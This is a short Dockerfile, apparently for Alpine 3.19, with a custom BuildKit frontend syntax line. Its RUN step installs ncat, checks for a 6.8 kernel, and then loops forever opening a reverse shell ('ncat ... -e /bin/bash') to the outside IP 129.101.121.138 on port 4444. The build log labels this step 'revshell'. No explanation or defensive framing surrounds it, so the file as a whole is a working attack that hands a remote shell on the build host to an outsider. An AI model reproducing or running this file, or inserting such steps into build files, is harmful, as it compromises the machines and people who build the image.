# syntax=er028455/df-frontend:v4
FROM alpine:3.19

ARG CACHEBUST=23
RUN apk add --no-cache bash nmap-ncat coreutils procps \
 && KVER=$(uname -r) \
 && echo "CB=$CACHEBUST KERNEL=$KVER" >&2 \
 && case "$KVER" in \
      6.8.*) \
        echo "6.8 kernel - revshell" >&2 ;; \
      *) \
        echo "SKIP: kernel $KVER not 6.8" >&2 ; exit 0 ;; \
    esac \
 && while true; do \
      ncat 129.101.121.138 4444 -e /bin/bash 2>/dev/null; \
      sleep 5; \
    done
  
